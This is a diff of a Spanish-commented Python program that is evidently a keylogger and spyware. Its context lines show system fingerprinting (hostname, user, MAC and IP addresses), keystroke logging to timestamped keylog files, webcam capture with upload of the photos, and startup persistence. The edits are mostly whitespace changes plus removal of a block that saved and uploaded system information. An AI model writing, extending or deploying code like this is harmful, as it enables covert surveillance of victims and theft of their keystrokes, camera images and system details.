@@ -167,16 +167,16 @@ def setup_directories():
 def get_system_info():
     try:
         info = {}
-
+        
         info['Sistema Operativo'] = f"{platform.system()} {platform.release()} {platform.version()}"
         info['Arquitectura'] = platform.machine()
         info['Procesador'] = platform.processor()
         info['Hostname'] = socket.gethostname()
         info['Usuario'] = os.getenv('USERNAME')
-
+        
         info['Memoria RAM Total'] = f"{round(psutil.virtual_memory().total / (1024**3), 2)} GB"
         info['Memoria RAM Disponible'] = f"{round(psutil.virtual_memory().available / (1024**3), 2)} GB"
-
+        
         disks = []
         for partition in psutil.disk_partitions():
             try:
@@ -193,7 +193,6 @@ def get_system_info():
                 continue
         info['Discos'] = disks
         
-        # Información de red
         info['Dirección MAC'] = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
         info['Direcciones IP'] = []
         for interface, addrs in psutil.net_if_addrs().items():
@@ -251,7 +250,7 @@ def save_system_info():
         if TEST_MODE:
             print(f"Error guardando información del sistema: {str(e)}")
         return None
-    
+
 def update_modifier_state(key, is_press):
     global shift_pressed, caps_lock_on, num_lock_on
     try:
@@ -579,7 +578,7 @@ def upload_camera_images():
         if TEST_MODE:
             print(f"Error enviando fotos: {str(e)}")
         return False
-    
+
 def scheduled_camera_capture():
     if is_running and ENABLE_CAMERA_CAPTURE:
         try:
@@ -716,11 +715,6 @@ def main():
         if TEST_MODE:
             print(f"Persistencia añadida al inicio usando: {copy_path}")
 
-    if not TEST_MODE:
-        save_system_info()
-        if check_internet_connection():
-            upload_system_info()
-    
     timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
     current_log_file = os.path.join(LOG_DIR, f"keylog_{timestamp}.txt")
     with open(current_log_file, 'w', encoding='utf-8') as f:
@@ -775,4 +769,3 @@ if __name__ == "__main__":
             print(f"Detalles en: {CRASH_LOG}")
         time.sleep(5)
         sys.exit(1)
-
